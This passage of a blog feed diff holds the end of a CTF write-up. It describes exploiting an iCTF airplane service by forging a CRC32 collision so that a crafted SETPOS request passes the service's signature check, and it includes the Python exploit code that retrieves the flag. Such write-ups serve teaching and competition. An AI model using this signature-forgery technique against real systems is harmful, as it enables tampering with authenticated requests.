+&lt;span class="n"&gt;ox&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ox&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;iDiff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;70&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oy&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;iDiff&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;70&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This should yield a vector &lt;tt class="docutils literal"&gt;(ox,oy)&lt;/tt&gt; that offsets the flight position orthogonal to its current direction. Also there is a limit on the distance the flight can travel with one SETPOS request - hence the normalizing and multiplying with 70 (100/sqrt(2)).&lt;/p&gt;
+&lt;p&gt;Now we generate a request with a wrong signature so that we get a signed ERROR message from the service. Then we use that ERROR message signature together with a crafted SETPOS request and the CRC32 forging code to trick the signature verification.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CODE=LIST&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;ID={0}&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;RAND=.6..FS.O&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;SIGN=2638147f&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fid&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SIGN&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;RAND&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;pulen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SIGN&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ERROR&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;RAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;span class="n"&gt;targetcrc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ComputeSignNum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SETPOS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FGID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;flag_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;fid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;POSX&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;posx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ox&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;POSY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;posy&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;oy&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;RAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;GenRandomValues&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="n"&gt;oldinput&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ComputeSignEx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c"&gt;# thanks, StalkR&lt;/span&gt;
+&lt;span class="n"&gt;newinput&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;targetcrc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oldinput&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oldinput&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Finally we send out that request and then read in the FLAG from the response - profit!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;RAND&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;newinput&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;SIGN&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pulen&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;pulen&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}={1}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;FLAG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;lines&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;FLAG&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I put the complete exploit (careful, ugly mess of python code) to &lt;a class="reference external" href="https://gist.github.com/rep/5229723"&gt;a gist here&lt;/a&gt;. When we uploaded that and it actually worked - people were surprised and scared at the same time. We thought about rewriting it a bit before uploading - but I think it shows quite nicely under which pressure we all are coding during a CTF ;)&lt;/p&gt;
+&lt;img alt="" src="pictures/airplane_exploit_works.jpg" /&gt;
+&lt;p&gt;Picture &lt;a class="reference external" href="http://www.flickr.com/photos/heipei/8582590139/"&gt;Source&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="aftermath"&gt;
+&lt;h2&gt;Aftermath&lt;/h2&gt;
+&lt;p&gt;Basically this exploit took us relatively long to build because of struggling with the new iCTF exploit framework style (the exploit runs on their systems, not on ours) and also because we did try to analyze the setflag/getflag functionality that the gameserver uses before thinking about the vulnerability presented above.&lt;/p&gt;
+&lt;p&gt;In the end it was a nice service - not too straight-forward to exploit, but also not overly complicated. We struggled also a bit to get the CRC32 collision going - thankfully Andy Straub found &lt;a class="reference external" href="https://twitter.com/stalkr_"&gt;StalkR&lt;/a&gt;'s post in the end. That saved us a lot of time.&lt;/p&gt;
+&lt;p&gt;I was working on this service together with &lt;a class="reference external" href="https://twitter.com/G33KatWork"&gt;Andy&lt;/a&gt;. While getting frustrated along the way, in the end this was quite fun!&lt;/p&gt;
+&lt;p&gt;The team (&lt;a class="reference external" href="http://ctf.itsec.rwth-aachen.de/"&gt;0ldEur0pe&lt;/a&gt;) only managed to get top 20 in the end - but that seems to be our story for iCTFs in the last years :)&lt;/p&gt;
+&lt;blockquote&gt;
+-- mark&lt;/blockquote&gt;
+&lt;/div&gt;
+</summary><category term="ctf"></category><category term="exploit"></category><category term="ictf"></category><category term="ucsb"></category></entry><entry><title>__init__()</title><link href="/site-init.html" rel="alternate"></link><updated>2013-03-23T20:00:00+01:00</updated><author><name>Mark Schloesser</name></author><id>tag:,2013-03-23:site-init.html</id><summary type="html">&lt;p&gt;I had to quickly setup a site for posting the UCSB exploit write-up to. This is it powered by Pelican - a static page generator in Python.&lt;/p&gt;
+</summary><category term="blog"></category><category term="site"></category></entry></feed>
